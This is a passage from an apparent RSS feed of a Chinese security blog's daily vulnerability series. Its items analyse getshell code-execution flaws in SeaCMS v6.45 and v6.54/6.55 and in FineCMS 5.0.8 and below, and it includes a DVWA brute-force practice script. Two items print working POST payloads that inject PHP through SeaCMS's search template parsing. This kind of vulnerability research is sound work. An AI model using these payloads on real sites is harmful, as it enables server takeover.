$step3=strbetween($strout,&amp;#34;{step3}&amp;#34;,&amp;#34;{/step3}&amp;#34;); $step4=strbetween($strout,&amp;#34;{step4}&amp;#34;,&amp;#34;{/step4}&amp;#34;); if ($action==&amp;#34;&amp;#34;){ $strout=str_replace(&amp;#34;{step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{/step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step2}&amp;#34;.$step2.&amp;#34;{/step2}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step3}&amp;#34;.$step3.&amp;#34;{/step3}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step4}&amp;#34;.$step4.&amp;#34;{/step4}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; } if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; checkyzm($_POST[&amp;#34;yzm&amp;#34;]); $rs=query(&amp;#34;select mobile,email from zzcms_user where username=&amp;#39;&amp;#34; .</description>
    </item>
    
    <item>
      <title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
      <pubDate>Sat, 03 Mar 2018 23:32:41 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
      <description>前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;amp;searchword={if{searchpage:year}&amp;amp;year=:e{searchpage:area}}&amp;amp;area=v{searchpage:letter}&amp;amp;letter=al{searchpage:lang}&amp;amp;yuyan=(join{searchpage:jq}&amp;amp;jq=($_P{searchpage:ver}&amp;amp;ver=OST[9]))&amp;amp;9[]=ph&amp;amp;9[]=pinfo();
执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&amp;#34;{seacms:searchword}&amp;#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&amp;#39;全部&amp;#39;; $jq = !empty($jq)?$jq:&amp;#39;全部&amp;#39;; $area = !empty($area)?$area:&amp;#39;全部&amp;#39;; $year = !empty($year)?$year:&amp;#39;全部&amp;#39;; $yuyan = !empty($yuyan)?$yuyan:&amp;#39;全部&amp;#39;; $letter = !empty($letter)?$letter:&amp;#39;全部&amp;#39;; $state = !empty($state)?$state:&amp;#39;全部&amp;#39;; $ver = !</description>
    </item>
    
    <item>
      <title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
      <pubDate>Fri, 02 Mar 2018 19:28:36 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
      <description>前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &amp;lt; &amp;#39;4.1.0&amp;#39;) { $_GET = &amp;amp;$HTTP_GET_VARS; $_POST = &amp;amp;$HTTP_POST_VARS; $_COOKIE = &amp;amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;amp;$HTTP_SERVER_VARS; $_ENV = &amp;amp;$HTTP_ENV_VARS; $_FILES = &amp;amp;$HTTP_POST_FILES; } ...... foreach(Array(&amp;#39;_GET&amp;#39;,&amp;#39;_POST&amp;#39;,&amp;#39;_COOKIE&amp;#39;) as $_request) { foreach($$_request as $_k =&amp;gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。</description>
    </item>
    
    <item>
      <title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</title>
      <link>https://getshe11.com/posts/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</link>
      <pubDate>Wed, 28 Feb 2018 22:23:23 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</guid>
      <description>前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&amp;#39;&amp;amp;&amp;#39;, $this-&amp;gt;input-&amp;gt;post(&amp;#39;url&amp;#39;)); //经过&amp;amp; 分割  foreach ($url as $t) { $item = explode(&amp;#39;=&amp;#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&amp;gt;uid &amp;amp;&amp;amp; exit(dr_json(0, fc_lang(&amp;#39;游客不允许上传附件&amp;#39;))); //对$p[&amp;#39;code&amp;#39;] 进行解码  list($size, $ext) = explode(&amp;#39;|&amp;#39;, dr_authcode($p[&amp;#39;code&amp;#39;], &amp;#39;DECODE&amp;#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#39;Ym&amp;#39;, SYS_TIME).&amp;#39;/&amp;#39;; !is_dir($path) &amp;amp;&amp;amp; dr_mkdirs($path); $furl = $this-&amp;gt;input-&amp;gt;post(&amp;#39;file&amp;#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !</description>
    </item>
    
    <item>
      <title>DVWA之Brute Force更新</title>
      <link>https://getshe11.com/posts/dvwa-brute-force-update-/</link>
      <pubDate>Wed, 28 Feb 2018 00:18:00 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/dvwa-brute-force-update-/</guid>
      <description>前言 今天又练习了一遍DVWA，发现了一些小问题。
问题一 在原文http://www.freebuf.com/articles/web/116437.html 中的python代码我重新运行了一遍，发现有错误。提示没有这个&#39;input&#39;的Type,所以我做了下修改就能正常运行了。 原先的user_token = soup.form.input.input.input.input[&amp;quot;value&amp;quot;] 改成了user_token = soup.find_all(&amp;quot;input&amp;quot;)[3].get(&amp;quot;value&amp;quot;)# get the user_token 代码如下：
from bs4 import BeautifulSoup import urllib2 header={ &amp;#39;Host&amp;#39;: &amp;#39;192.168.59.127&amp;#39;, &amp;#39;Cache-Control&amp;#39;: &amp;#39;max-age=0&amp;#39;, &amp;#39;If-None-Match&amp;#39;: &amp;#34;307-52156c6a290c0&amp;#34;, &amp;#39;If-Modified-Since&amp;#39;: &amp;#39;Mon, 05 Oct 2015 07:51:07 GMT&amp;#39;, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&amp;#39;, &amp;#39;Accept&amp;#39;: &amp;#39;*/*&amp;#39;, &amp;#39;Referer&amp;#39;: &amp;#39;http://192.168.59.127/dvwa/vulnerabilities/brute/index.php&amp;#39;, &amp;#39;Accept-Encoding&amp;#39;: &amp;#39;gzip, deflate, sdch&amp;#39;, &amp;#39;Accept-Language&amp;#39;: &amp;#39;zh-CN,zh;q=0.8&amp;#39;, &amp;#39;Cookie&amp;#39;: &amp;#39;security=high; PHPSESSID=4ac4tdpdn25suknveha54ml3i2&amp;#39;} requrl = &amp;#34;http://192.168.59.127/dvwa/vulnerabilities/brute/&amp;#34; def get_token(requrl,header): req = urllib2.Request(url=requrl, headers=header) response = urllib2.</description>
    </item>
    
  </channel>
</rss>
